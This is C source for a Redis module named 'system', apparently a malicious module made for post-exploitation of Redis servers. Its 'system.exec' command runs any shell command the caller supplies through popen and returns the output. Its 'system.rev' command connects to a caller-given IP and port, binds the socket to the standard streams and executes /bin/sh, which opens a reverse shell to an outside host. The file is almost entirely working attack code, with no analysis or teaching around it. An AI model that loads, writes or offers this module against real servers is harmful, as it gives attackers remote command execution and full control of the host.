#include "redismodule.h"

#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>  // Required for inet_addr()
#include <string.h>     // Required for strlen(), strcat()

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) {
        return RedisModule_WrongArity(ctx);
    }

    size_t cmd_len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
    if (!cmd || cmd_len == 0) {
        return RedisModule_ReplyWithError(ctx, "ERR invalid command");
    }

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        return RedisModule_ReplyWithError(ctx, "ERR command execution failed");
    }

    size_t size = 1024;
    char *buf = malloc(size);
    char *output = calloc(size, sizeof(char));
    if (!buf || !output) {
        pclose(fp);
        return RedisModule_ReplyWithError(ctx, "ERR memory allocation failed");
    }

    while (fgets(buf, size, fp) != NULL) {
        if (strlen(buf) + strlen(output) >= size) {
            size *= 2;
            output = realloc(output, size);
            if (!output) {
                free(buf);
                pclose(fp);
                return RedisModule_ReplyWithError(ctx, "ERR memory reallocation failed");
            }
        }
        strncat(output, buf, size - strlen(output) - 1);
    }

    RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
    RedisModule_ReplyWithString(ctx, ret);

    free(buf);
    free(output);
    pclose(fp);
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) {
        return RedisModule_WrongArity(ctx);
    }

    size_t cmd_len;
    const char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
    const char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
    
    if (!ip || !port_s || cmd_len == 0) {
        return RedisModule_ReplyWithError(ctx, "ERR invalid IP or port");
    }

    int port = atoi(port_s);
    if (port <= 0 || port > 65535) {
        return RedisModule_ReplyWithError(ctx, "ERR invalid port number");
    }

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        return RedisModule_ReplyWithError(ctx, "ERR socket creation failed");
    }

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons(port);

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(s);
        return RedisModule_ReplyWithError(ctx, "ERR connection failed");
    }

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    char *args[] = { "/bin/sh", NULL };
    execve("/bin/sh", args, NULL);

    close(s);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
